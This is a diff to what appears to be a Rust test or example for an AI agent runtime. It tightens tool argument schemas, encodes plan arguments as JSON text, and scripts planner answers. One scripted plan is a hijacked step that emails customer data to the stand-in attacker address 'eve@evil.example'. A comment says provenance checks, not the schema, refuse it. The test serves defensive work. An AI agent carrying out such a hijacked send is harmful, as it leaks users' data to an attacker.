@@ -95,6 +95,7 @@ spec:
       description: Look up a customer record by id.
       arguments:
         type: object
+        additionalProperties: false
         properties:
           id: { type: string }
         required: [id]
@@ -113,12 +114,22 @@ spec:
           allowed_sources: ["tool://crm/lookup"]
       arguments:
         type: object
+        additionalProperties: false
         properties:
           to: { type: string }
         required: [to]
   execution: { kind: planned, max_turns: 4 }
   budgets: {}
 "#;
+
+/// A tool step as it travels.
+///
+/// `args` is JSON **text** on the wire, because constrained decoding has no
+/// free-form object — a plan carrying one could not be asked for from a real
+/// provider at all.
+fn call(tool: &str, args: &Value) -> Value {
+    json!({ "tool": tool, "args": args.to_string(), "parse": null })
+}
 
 /// A scripted planner answer: the structured plan, nothing else.
 fn plans(structured: Value) -> Completion {
@@ -143,8 +154,8 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let provider = FakeProvider::new();
     provider.will_answer(plans(json!({
         "steps": [
-            { "tool": "crm__lookup", "args": { "id": "$input/customer" } },
-            { "tool": "mail__send",  "args": { "to": "$step0/email" } }
+            call("crm__lookup", &json!({ "id": "$input/customer" })),
+            call("mail__send", &json!({ "to": "$step0/email" }))
         ],
         "answer": "$step0/email"
     })));
@@ -200,9 +211,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     // schema is not the control here, and could never be: `eve@evil.example`
     // is a perfectly valid string. Provenance is what refuses it.
     provider.will_answer(plans(json!({
-        "steps": [
-            { "tool": "mail__send", "args": { "to": "eve@evil.example" } }
-        ],
+        "steps": [call("mail__send", &json!({ "to": "eve@evil.example" }))],
         "answer": "sent"
     })));
     let hijacked = rt
